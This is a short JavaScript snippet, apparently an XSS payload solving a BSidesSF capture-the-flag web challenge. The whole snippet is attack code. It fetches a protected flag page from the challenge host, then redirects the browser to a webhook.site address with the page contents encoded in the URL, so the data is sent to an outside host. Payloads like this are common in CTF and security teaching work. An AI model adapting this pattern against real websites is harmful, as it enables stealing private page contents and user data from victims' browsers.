fetch("https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag",{ mode: 'no-cors'})
    .then(response => response.text())
    .then(data => {
      window.location.href = `https://webhook.site/ca29ad34-6c1d-49f7-ac5e-8d231cf04e74?responseFromXSS=${encodeURIComponent(data)}`;
    });
